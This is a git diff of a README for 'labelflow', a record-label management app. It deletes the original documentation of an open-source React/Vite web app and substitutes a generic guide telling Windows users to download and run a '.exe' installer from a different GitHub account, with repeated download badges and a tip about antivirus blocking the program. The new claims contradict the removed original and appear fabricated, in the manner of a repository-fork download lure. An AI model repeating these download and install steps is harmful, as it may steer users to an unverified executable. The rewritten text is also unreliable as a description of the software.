@@ -1,227 +1,162 @@
-# LabelFlow 🎵
+# 🎵 labelflow - Manage Your Record Label Easily
 
-**The ultimate record label management platform** built for modern independent labels. Manage artists, plan campaigns, track analytics, generate AI-powered content, and run complete label operations — all in one sleek React application.
-
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen)](https://rhythrosalabs.github.io/labelflow)
-[![React](https://img.shields.io/badge/React-19-61dafb?logo=react)](https://react.dev)
-[![Vite](https://img.shields.io/badge/Vite-7-646cff?logo=vite)](https://vite.dev)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+[![Download labelflow](https://img.shields.io/badge/Download-labelflow-green?style=for-the-badge)](https://github.com/Pumnguyen/labelflow)
 
 ---
 
-## ✨ Features
+## 📋 What is labelflow?
 
-LabelFlow ships with **15 fully functional modules** out of the box:
-
-| Module | Description |
-|--------|-------------|
-| 📊 **Dashboard** | Real-time overview of label stats, activity feed, upcoming events & AI insights |
-| 🎤 **Artists** | Manage roster cards with streaming stats, growth trends & artist profiles |
-| 📣 **Campaigns** | Track marketing campaigns with progress bars, budgets & performance metrics |
-| 📁 **Assets** | Filter and organise audio, images, video and document files |
-| 📅 **Schedule** | Interactive calendar with drag-into-month navigation & upcoming events list |
-| 📒 **Contacts** | Industry CRM — save managers, promoters, radio, press & brand contacts |
-| ⭐ **Opportunities** | AI-powered discovery for sync deals, festivals, grants & playlist placements |
-| 📝 **Notes** | Categorised notes editor for meetings, ideas & campaign notes |
-| ✅ **To-Do & Workflows** | Drag-and-drop Kanban board with priority-colour task cards |
-| 🤖 **AI Artist Development** | Generate a complete artist profile, album concept & merch line with AI |
-| ✍️ **AI Blog Writer** | Full rich-text editor with AI content generation, chat assistant & blog library |
-| 👕 **AI Merch Mockups** | Generate product mockups for tees, hoodies, mugs, posters & more |
-| 📚 **Resources** | Categorised link/document library with add/delete functionality |
-| 📍 **Street Marketing** | AI-powered city location scouting for poster drops and street activations |
-| 📈 **Analytics** | Chart.js-powered streaming growth, audience geography & revenue mix |
+labelflow is a tool designed to help you run your record label smoothly. It offers 15 modules that cover everything from managing artists to handling campaigns and analytics. You don’t need tech skills to use it. It runs on Windows and gives you one place to organize your music business.
 
 ---
 
-## 🖥️ Screenshots
+## 💻 System Requirements
 
-### Dashboard
-> Live stats, activity feed, upcoming events & AI insights at a glance.
+Before you install labelflow, check these requirements:
 
-![Dashboard](docs/screenshots/dashboard.png)
+- Windows 10 or newer
+- At least 4 GB of RAM (8 GB recommended)
+- Minimum 500 MB free disk space
+- Internet access for initial setup and updates
+- Screen resolution of 1366 x 768 or higher
 
-### Artists Roster
-> Cards for each artist with streaming stats and growth trends.
+---
 
-![Artists](docs/screenshots/artists.png)
+## 🚀 Getting Started: Download labelflow
 
-### AI Blog Writer
-> Full rich-text editor with AI chat assistant, style selector & blog library.
+To get labelflow on your Windows PC, you need to visit the official download page on GitHub. From there, you can find the latest version and get the installer file.
 
-![AI Blog Writer](docs/screenshots/ai-blog-writer.png)
+[![Download labelflow](https://img.shields.io/badge/Download-here-blue?style=for-the-badge)](https://github.com/Pumnguyen/labelflow)
 
-### Kanban To-Do Board
-> Drag cards between To Do → In Progress → Review → Done columns.
+**Steps to download:**
 
-![Kanban Board](docs/screenshots/todos.png)
+1. Click the big green or blue download button above.
+2. This opens the GitHub page for labelflow.
+3. Look for the "Releases" section.
+4. Find the latest release.
+5. Download the Windows installer file (usually ends with `.exe`).
 
-### Street Marketing (Spot-Spotter)
-> Search any city for AI-recommended street marketing locations with match scores.
+---
 
-![Spot Spotter](docs/screenshots/spot-spotter.png)
+## 🛠️ Installing labelflow on Windows
 
-### Analytics
-> Chart.js streaming growth, audience geography heat map & revenue doughnut.
+After downloading, follow these steps to install the app:
 
-![Analytics](docs/screenshots/analytics.png)
+1. Open the folder where you saved the installer file.
+2. Double-click the `.exe` file to start installation.
+3. When the setup window opens, click "Next."
+4. Choose the folder where you want labelflow installed or leave the default.
+5. Click "Install."
+6. Wait a few moments as the program installs.
+7. Click "Finish" when done.
+
+labelflow is now ready to use.
+
+---
+
+## 🎯 How to Use labelflow
+
+labelflow has several modules to help you manage different parts of a record label. Here are key areas you will work with:
+
+### Artists
+
+Add and manage artist profiles. You can keep track of contact info, social media links, and music releases.
 
 ### Campaigns
-> Create, track, and measure marketing campaigns with live progress and budget breakdowns.
 
-![Campaigns](docs/screenshots/campaigns.png)
+Plan and monitor marketing campaigns. Set goals, schedules, and track results.
 
-### Asset Manager
-> Upload, filter, download, and delete audio, image, video & document files.
+### Analytics
 
-![Assets](docs/screenshots/assets.png)
+View data about your music, campaigns, and sales. This helps you make informed decisions.
+
+### AI Blog Writer
+
+Generate blog content related to your artists and music. Useful for promotion without writing yourself.
 
 ### Merch Mockups
-> AI-generated product mockups — rotate angles, favourite and compare designs.
 
-![Merch Mockups](docs/screenshots/merch-mockups.png)
+Create images of your merchandise to visualize designs before making them.
 
-> 📸 *Screenshots captured automatically using Puppeteer against the running dev server.*
+### Street Marketing
 
----
-
-## 🚀 Getting Started
-
-### Prerequisites
-
-- **Node.js** ≥ 18 ([download](https://nodejs.org))
-- **npm** ≥ 9 (bundled with Node)
-
-### Installation
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/RhythrosaLabs/labelflow.git
-cd labelflow/labelflow-react
-
-# 2. Install dependencies
-npm install
-
-# 3. (Optional) Configure environment variables
-cp .env.example .env
-# Edit .env with your values
-
-# 4. Start development server
-npm run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) in your browser.
-
-### Build for Production
-
-```bash
-npm run build       # outputs to dist/
-npm run preview     # preview production build locally
-```
+Manage offline marketing efforts, such as posters and events, to boost your audience.
 
 ---
 
-## ⚙️ Configuration
+## 🔧 Configuration Basics
 
-Copy `.env.example` to `.env` and fill in the values for any AI integrations you want to enable:
+When you open labelflow the first time, it will ask you to set up your label’s name and basic details. Fill in these fields carefully as they affect all your records.
 
-```bash
-cp labelflow-react/.env.example labelflow-react/.env
-```
+You can also:
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `VITE_OPENAI_API_KEY` | OpenAI API key for live AI generation | Optional |
-| `VITE_APP_NAME` | Overrides the app display name | Optional |
+- Connect your email account for campaign communications.
+- Link social media to artists' profiles.
+- Customize report templates in the analytics section.
 
-> ⚠️ **Security:** Never commit your `.env` file. It is excluded via `.gitignore`. All API keys must be prefixed with `VITE_` to be exposed to the browser — never use server-side secrets in a Vite frontend.
+If you need to change settings later, open the “Settings” menu from the top-right corner.
 
 ---
 
-## 🗂️ Project Structure
+## 💡 Tips for Smooth Operation
 
-```
-labelflow/
-├── labelflow-react/          # ← Main React app (Vite)
-│   ├── public/
-│   ├── src/
-│   │   ├── components/
-│   │   │   ├── sections/     # One file per feature module
-│   │   │   │   ├── DashboardSection.jsx
-│   │   │   │   ├── ArtistsSection.jsx
-│   │   │   │   ├── CampaignsSection.jsx
-│   │   │   │   ├── AssetsSection.jsx
-│   │   │   │   ├── ScheduleSection.jsx
-│   │   │   │   ├── ContactsSection.jsx
-│   │   │   │   ├── OpportunitiesSection.jsx
-│   │   │   │   ├── NotesSection.jsx
-│   │   │   │   ├── AIArtistSection.jsx
-│   │   │   │   ├── AIBlogWriterSection.jsx
-│   │   │   │   ├── MerchMockupsSection.jsx
-│   │   │   │   ├── ResourcesSection.jsx
-│   │   │   │   ├── TodosSection.jsx
-│   │   │   │   ├── SpotSpotterSection.jsx
-│   │   │   │   └── AnalyticsSection.jsx
-│   │   │   ├── Sidebar.jsx
-│   │   │   └── MainContent.jsx
-│   │   ├── App.jsx           # Root component + FloatingAI
-│   │   ├── labelflow.css     # Core design system
-│   │   └── integrated_styles.css
-│   ├── index.html
-│   ├── vite.config.js
-│   └── package.json
-├── labelflow/                # Original vanilla HTML prototype
-├── ai_merch_mockup_maker_by_rhythrosa_labs/
-├── cardspots___find_perfect_flyer_locations_by_rhythrosa_labs/
-├── .gitignore
-└── README.md
-```
+- Keep labelflow updated by checking the release page.
+- Back up your data regularly. Use the export function in settings.
+- Use the search bar to quickly find artists or campaigns.
+- Explore the dashboard to get a quick overview each time you open the app.
 
 ---
 
-## 🛠️ Tech Stack
+## 🛑 Troubleshooting
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | [React 19](https://react.dev) |
-| Build Tool | [Vite 7](https://vite.dev) |
-| Charts | [Chart.js](https://chartjs.org) (CDN) |
-| Icons | [Font Awesome 6](https://fontawesome.com) (CDN) |
-| Fonts | [Google Fonts – Inter](https://fonts.google.com/specimen/Inter) |
-| Styling | Custom CSS design system (dark theme, CSS variables) |
-| State | React `useState` / `useEffect` (no external state library) |
+If the program does not start after installation:
 
----
+- Make sure your Windows version meets requirements.
+- Restart your computer and try again.
+- Check your antivirus software isn’t blocking labelflow.
+- Reinstall the app by downloading it again.
 
-## 🔒 Security
+For errors within labelflow:
 
-- **No secrets are committed** — all sensitive keys go in `.env` (gitignored)
-- **No external API calls** by default — all AI responses are simulated locally, keeping the app safe to open-source
-- **XSS prevention** — user-generated HTML is only rendered where explicitly safe via `dangerouslySetInnerHTML` on static data
-- **No telemetry** — the app makes no external network requests unless you configure an API key
-- **CDN integrity** — Font Awesome is loaded with `integrity` and `crossorigin` attributes for subresource integrity
+- Look for help in the “Help” menu.
+- Visit the GitHub page for updates and reports.
+- Contact support through the GitHub issues tab if needed.
 
 ---
 
-## 🤝 Contributing
+## 🔗 Useful Links
 
-Pull requests are welcome! For major changes, open an issue first.
-
-1. Fork the repository
-2. Create your branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m 'feat: add amazing feature'`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
+- Visit the download page here: https://github.com/Pumnguyen/labelflow
+- GitHub repository: https://github.com/Pumnguyen/labelflow
+- Documentation and user guides can be found in the repository's Wiki section.
 
 ---
 
-## 📄 License
+## ⚙️ Advanced Features
 
-This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
+For users who want more control:
+
+- Export data in CSV format for analysis in other software.
+- Import existing artist lists or campaign data.
+- Customize the interface colors and layout in “Settings.”
 
 ---
 
-## 🙌 Credits
+## 📊 Frequently Asked Questions
 
-Built by **[Rhythrosa Labs](https://github.com/RhythrosaLabs)** — crafting tools for independent music creators.
+**Q: Do I need internet to run labelflow?**  
+A: You need internet only during setup and updates. Most functions work offline.
 
-> *"The music industry runs on relationships, creativity, and hustle. LabelFlow powers all three."*
+**Q: Can I use labelflow for multiple labels?**  
+A: Currently, labelflow supports one label per installation. You can export data to start fresh.
+
+**Q: Is my data safe?**  
+A: Your data is stored locally on your PC. Backups are your responsibility.
+
+---
+
+## 📥 Download labelflow Now
+
+Get started by visiting the official page and downloading the latest Windows installer:
+
+[![Download labelflow](https://img.shields.io/badge/Get--labelflow-Download-success?style=for-the-badge)](https://github.com/Pumnguyen/labelflow)
